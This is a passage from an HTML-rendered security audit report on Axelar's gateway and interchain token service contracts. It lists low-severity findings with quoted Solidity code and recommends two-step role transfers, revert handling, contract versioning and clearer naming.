class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">TokenManagerType</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManagerType</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">TokenManagerType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MINT_BURN</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">implementationMintBurn</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">TokenManagerType</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManagerType</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">TokenManagerType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LIQUIDITY_POOL</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">implementationLiquidityPool</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">233</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>Other integrations can rely on this and returning <code>address(0)</code> for the implementation contract can break their integrations.</p>\n<h3 id=\"recommendation-7\" style=\"position:relative;\"><a href=\"#recommendation-7\" aria-label=\"recommendation 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider reverting with <code>Invalid TokenManagerType</code> or similar.</p>\n<h2 id=\"l-09-consider-a-two-way-transfer-of-governance\" style=\"position:relative;\"><a href=\"#l-09-consider-a-two-way-transfer-of-governance\" aria-label=\"l 09 consider a two way transfer of governance permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-09] Consider a two way transfer of <code>governance</code></h2>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/AxelarGateway.sol#L254-L258\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/AxelarGateway.sol#L254-L258</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">cgp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AxelarGateway</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">254</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferGovernance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newGovernance</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGovernance</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">255</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newGovernance</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidGovernance</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">256</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">257</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_transferGovernance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newGovernance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">257</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>The <code>governance</code> address has complete control over the <code>AxelarGatway</code> since it can do upgrades. </p>\n<h3 id=\"recommendation-8\" style=\"position:relative;\"><a href=\"#recommendation-8\" aria-label=\"recommendation 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider implementing a two way (propose/accept) change procedure for it to avoid accidentally handing it over to the wrong address.</p>\n<h2 id=\"l-10-consider-a-two-way-transfer-of-operator-and-distributor\" style=\"position:relative;\"><a href=\"#l-10-consider-a-two-way-transfer-of-operator-and-distributor\" aria-label=\"l 10 consider a two way transfer of operator and distributor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-10] Consider a two way transfer of <code>operator</code> and <code>distributor</code></h2>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/utils/Distributable.sol#L51-L53\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/utils/Distributable.sol#L51-L53</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/utils/Operatable.sol#L51-L53\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/utils/Operatable.sol#L51-L53</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Operatable</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setOperator</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operator_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOperator</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_setOperator</span><span class=\"mtk1\">(</span><span class=\"mtk12\">operator_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">53</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>The exact same code is in <code>Distributable</code> as well, as these are powerful roles in for tokens/token managers.</p>\n<h3 id=\"recommendation-9\" style=\"position:relative;\"><a href=\"#recommendation-9\" aria-label=\"recommendation 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider implementing a two way (propose/accept) change procedure for it to avoid accidentally handing it over to the wrong address.</p>\n<h2 id=\"s-01-consider-adding-a-version-to-upgradable-contracts\" style=\"position:relative;\"><a href=\"#s-01-consider-adding-a-version-to-upgradable-contracts\" aria-label=\"s 01 consider adding a version to upgradable contracts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[S-01] Consider adding a version to upgradable contracts</h2>\n<p>That way, a user can query a contract and see if it is upgraded or not.</p>\n<h2 id=\"r-01-sourceaddress-means-two-different-things-in-interchaintokenservice\" style=\"position:relative;\"><a href=\"#r-01-sourceaddress-means-two-different-things-in-interchaintokenservice\" aria-label=\"r 01 sourceaddress means two different things in interchaintokenservice permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-01] <code>sourceAddress</code> means two different things in <code>InterchainTokenService</code></h2>\n<p>In the function <code>_execute</code>, which is the entry point from <code>AxelarExecutor</code>, <code>sourceAddress</code> means the source for the cross-chain call, i.e the <code>sourceChain</code> address of that <code>InterchainTokenSerivce</code> contract:</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L575-L579\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L575-L579</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">575</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_execute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">576:        </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sourceChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">577:        </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sourceAddress</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// &lt;-- `sourceAddress` is which contract initiated the cross chain instruction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">578:        </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">payload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">579</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRemoteService</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">notPaused</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>Elsewhere in the code, in <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L622-L640\"><code>_processSendTokenWithDataPayload</code></a>, <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L502-L509\"><code>transmitSendToken</code></a> and <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L467-L475\"><code>expressReceiveTokenWithData</code></a>, the meaning of <code>sourceAddress</code> has changed to which address the transferred tokens originate from:</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L622-L640\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L622-L640</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">622</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_processSendTokenWithDataPayload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payload</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">623</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">624</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">625</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// &lt;-- `sourceAddress` is from which address the tokens originate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">633</span><span class=\"mtk1\">:        {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">634</span><span class=\"mtk12\">:</span><span class=\"mtk1\">            </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destinationAddressBytes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">635</span><span class=\"mtk1\">:            (, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">destinationAddressBytes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">636</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">payload</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">637</span><span class=\"mtk1\">:                (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">638</span><span class=\"mtk1\">:            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">639</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">destinationAddressBytes</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">640</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<p>This can cause confusion and as <code>sourceAddress</code> in the context of <code>_execute</code>, is a critical for security checks to trust the call it could be risky if these are confused for each other.</p>\n<h3 id=\"recommendation-10\" style=\"position:relative;\"><a href=\"#recommendation-10\" aria-label=\"recommendation 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider changing the token transfer source to <code>tokenSenderAddress</code> for it to be clear what it means.</p>\n<h2 id=\"r-02-interchaintokenservice_validatetoken-could-have-a-more-descriptive-name\" style=\"position:relative;\"><a href=\"#r-02-interchaintokenservice_validatetoken-could-have-a-more-descriptive-name\" aria-label=\"r 02 interchaintokenservice_validatetoken could have a more descriptive name permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-02] <code>InterchainTokenService::_validateToken</code> could have a more descriptive name</h2>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L726-L738\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L726-L738</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">726</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">727:        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">728:        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">732:        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">733:    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">734</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">IERC20Named</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20Named</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">735</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">name</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">name</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">736</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">symbol</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">symbol</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">737</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">738</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p><code>_validateToken</code> doesn’t do any actual validation. Could be renamed to <code>_getTokenData</code> or similar.</p>\n<h2 id=\"r-03-axelargatewayonlymintlimiter-could-have-a-more-descriptive-name\" style=\"position:relative;\"><a href=\"#r-03-axelargatewayonlymintlimiter-could-have-a-more-descriptive-name\" aria-label=\"r 03 axelargatewayonlymintlimiter could have a more descriptive name permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-03] <code>AxelarGateway::onlyMintLimiter</code> could have a more descriptive name</h2>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/AxelarGateway.sol#L87-L88\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/AxelarGateway.sol#L87-L88</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">cgp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AxelarGateway</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span 